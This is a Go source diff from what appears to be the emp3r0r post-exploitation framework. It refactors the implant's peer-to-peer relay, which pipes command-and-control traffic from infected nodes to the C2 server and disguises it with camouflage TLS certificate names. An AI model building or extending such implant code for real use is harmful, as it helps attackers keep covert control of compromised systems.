@@ -7,6 +7,7 @@ import (
 	"io"
 	"net"
 	"runtime/debug"
+	"strconv"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -35,7 +36,7 @@ const (
 // and returns a net.Conn. If opcode is OpcodeConnectC2, the conn is transparently
 // piped to the real C2 TLS endpoint.
 func DialGateway(ctx context.Context, gatewayIP string, opcode byte) (net.Conn, error) {
-	kcpPort := common.RuntimeConfig.KCPServerPort
+	kcpPort := common.RuntimeConfig.P2PRelayPort
 	addr := fmt.Sprintf("%s:%s", gatewayIP, kcpPort)
 
 	var kcpConn net.Conn
@@ -86,30 +87,26 @@ func DialGateway(ctx context.Context, gatewayIP string, opcode byte) (net.Conn, 
 	}
 }
 
-// ServeRelay accepts incoming KCP connections from Silent Nodes, reads the opcode,
-// and if it is CONNECT_C2, dials the real C2 and pipes bytes bidirectionally.
-// Only called on Gateway nodes.
+// ServeRelay accepts incoming P2P connections from peers (relaying C2 traffic or serving files).
 func ServeRelay(ctx context.Context) {
-	kcpPort := common.RuntimeConfig.KCPServerPort
-
-	// Create ONE persistent listener for the lifetime of the relay.
-	// Previously AcceptKCP created+closed a new UDP socket per accept call,
-	// which invalidated the connection that was just handed off to handleRelayConn.
-	var listener net.Listener
-	var err error
-
 	t := transport.GetTransportImplementation(common.RuntimeConfig.P2PTransport)
 	if camo, ok := t.(*transport.CamouflageMTLS); ok {
 		camo.CertOrg = common.RuntimeConfig.CamouflageCertOrg
 		camo.CertCN = common.RuntimeConfig.CamouflageCertCN
 	}
-	listener, err = t.Listen(kcpPort, common.RuntimeConfig.Password, def.MagicString)
-	logging.Infof("Mesh: Gateway relay listening on %s port %s", common.RuntimeConfig.P2PTransport, kcpPort)
 
+	listenPortStr := common.RuntimeConfig.P2PRelayPort
+	listener, err := t.Listen(listenPortStr, common.RuntimeConfig.Password, def.MagicString)
 	if err != nil {
-		logging.Errorf("Mesh ServeRelay: failed to listen on %s port %s: %v", common.RuntimeConfig.P2PTransport, kcpPort, err)
+		logging.Errorf("Mesh ServeRelay: failed to listen on %s port %s: %v", common.RuntimeConfig.P2PTransport, listenPortStr, err)
 		return
 	}
+
+	boundPort, _ := strconv.Atoi(listenPortStr)
+	SetLocalP2PPort(boundPort)
+	logging.Infof("Mesh: P2P relay listening on %s port %d", common.RuntimeConfig.P2PTransport, boundPort)
+	UpdateGossipMeta()
+
 	defer listener.Close()
 	go func() {
 		<-ctx.Done()
